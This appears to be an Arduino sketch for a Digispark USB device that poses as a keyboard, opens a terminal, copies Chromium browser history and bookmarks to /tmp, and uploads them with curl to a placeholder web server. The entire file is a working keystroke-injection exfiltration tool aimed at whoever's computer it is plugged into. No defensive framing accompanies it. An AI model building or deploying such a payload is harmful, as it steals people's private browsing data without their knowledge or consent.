#include <DigiUSB.h>
#include <DigiKeyboard.h>

void setup() {
  DigiUSB.begin();
  DigiKeyboard.begin();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_GUI_LEFT); // Open Terminal
  delay(1000);
  DigiKeyboard.println("cp ~/.config/chromium/Default/History /tmp/browser_history.txt"); // Copy chrome history
  delay(2000);
  DigiKeyboard.println("cp ~/.config/chromium/Default/Bookmarks /tmp/browser_bookmarks.txt"); // Copy chrome bookmarks
  delay(2000);
  DigiKeyboard.println("curl -F history=@/tmp/browser_history.txt -F bookmarks=@/tmp/browser_bookmarks.txt http://yourwebsite.com/upload.php"); // Upload files to web server
}